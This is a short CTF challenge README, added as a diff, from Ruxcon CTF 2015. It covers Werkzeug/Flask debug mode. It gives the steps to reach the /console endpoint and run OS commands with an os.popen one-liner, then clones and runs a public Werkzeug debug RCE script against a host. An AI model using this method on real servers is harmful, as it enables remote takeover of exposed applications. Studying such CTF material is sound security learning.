@@ -1,0 +1,15 @@
+
+Werkzeug DEBUG
+
+This challenge was written for Ruxcon CTF 2015 and cover the Debug mode of Werkzeug/Flask
+
+go to url/console
+use __import__('os').popen('<cmd>').read()
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+git clone https://github.com/its-arun/Werkzeug-Debug-RCE.git
+cd Werkzeug-Debug-RCE
+chmod +x werkzeug.py
+python werkzeug.py ptl-63e89638-8b2f2181.libcurl.so ls
